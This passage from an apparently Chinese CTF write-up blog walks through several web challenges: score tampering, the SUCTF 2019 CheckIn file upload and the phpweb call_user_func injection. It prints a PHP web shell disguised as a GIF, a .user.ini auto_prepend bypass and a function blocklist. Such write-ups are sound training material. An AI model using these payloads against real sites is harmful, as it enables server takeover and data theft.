formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;audio&#x27;</span>, blob, <span class="hljs-string">&#x27;recording.wav&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/compare-recording&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">body</span>: formData &#125;);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span>) <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;FLAG: &#x27;</span> + data.<span class="hljs-property">flag</span>);<br>&#125;<br><br><span class="hljs-comment">// 添加冷却时间绕过</span><br><span class="hljs-built_in">setTimeout</span>(getFlag, <span class="hljs-number">11000</span>); <span class="hljs-comment">// 等待11秒后执行</span><br></code></pre></td></tr></table></figure><h1 id="Mini-L-CTF-吃豆人"><a href="#Mini-L-CTF-吃豆人" class="headerlink" title="Mini L-CTF 吃豆人"></a>Mini L-CTF 吃豆人</h1><p>查看源码，得到上传的地址，<br>直接传  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/submit_score</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">29530</span><span class="hljs-symbol">/</span><br>Content-type:application<span class="hljs-symbol">/json</span><br><br>&#123;<br><span class="hljs-string">&quot;score&quot;</span>:<span class="hljs-number">50000</span><br>&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>前端可以自己改，还有注释，有很多方法解<br>比如前端找到吃豆逻辑吧吃一个蓝豆改为100000000直接拿到  </p><h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><p>这次换个文件头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure><p>回显  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>开门见孙笑川，然后会自己刷新，每次刷新都爆一样的错误</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-number">2025</span>-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">02</span>:<span class="hljs-number">09</span>:<span class="hljs-number">32</span> pm<br></code></pre></td></tr></table></figure><p>问一下deepseek：<br>这个警告意味着PHP在处理日期和时间时没有找到有效的时区设置。</p><p>好吧，知道站点真实目录   </p><p>扫一下目录,啥也没扫到<br>用bp抓包，发现它要刷新时就会向服务器返回如下请求头  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://b29f3d09-<span class="hljs-number">8</span>d9e-<span class="hljs-number">4</span>cdd-<span class="hljs-number">948</span>e-<span class="hljs-number">6</span>cce2ae6d854.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">func</span>=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure><p>把date改为flag.php看看  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: call_user_func() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a <span class="hljs-keyword">valid</span> callback, <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;flag.php&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> <span class="hljs-type">name</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>把p的值去掉值传func看看</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br></code></pre></td></tr></table></figure><p>没见过这种，没思路了<br>注意到，回显的时间好像符合p参数的格式<br>Y-m-d+h%3Ai%3As+a<br>那么尝试一下p参数  </p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">func=<span class="hljs-type">date</span>&amp;p=ls;ls<br><br><span class="hljs-symbol">Warning:</span> <span class="hljs-type">date</span>(): It <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> safe <span class="hljs-keyword">to</span> rely <span class="hljs-keyword">on</span> the system<span class="hljs-comment">&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br>Wednesday12;Wednesday12<br></code></pre></td></tr></table></figure><p>没办法了，看wp吧  </p><p>看好像func和p是能直接执行函数的，p就是参数，我还以为date是一个自定义函数  </p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">func=echo&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;echo</span>&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=system&amp;p=ls<br><br>Hacker...<br><br>func=highlight_file()&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: call_user_func() expects <span class="hljs-keyword">parameter</span> <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> be a valid callback, <span class="hljs-keyword">function</span> <span class="hljs-symbol">&#x27;highlight_file</span>()&#x27; <span class="hljs-keyword">not</span> found <span class="hljs-keyword">or</span> invalid <span class="hljs-keyword">function</span> name <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=./flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(./flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;./flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>func=highlight_file&amp;p=/../../../flag<br><br><span class="hljs-literal">Warning</span>: highlight_file(/../../../flag): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br><span class="hljs-literal">Warning</span>: highlight_file(): Failed opening &#x27;/../../../flag&#x27; <span class="hljs-keyword">for</span> highlighting <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">24</span><br><br>//看来无法进行目录穿越<br></code></pre></td></tr></table></figure><p>那就看源码吧<br>func&#x3D;highlight_file&amp;p&#x3D;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;phpweb&lt;/title&gt;<br>    &lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>        body &#123;<br>            background: <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&quot;bg.jpg&quot;</span>) no-repeat;<br>            background-size: <span class="hljs-number">100</span>%;<br>        &#125;<br>        p &#123;<br>            color: white;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;script language=javascript&gt;<br>    <span class="hljs-title function_ invoke__">setTimeout</span>(<span class="hljs-string">&quot;document.form1.submit()&quot;</span>,<span class="hljs-number">5000</span>)<br>&lt;/script&gt;<br>&lt;p&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span 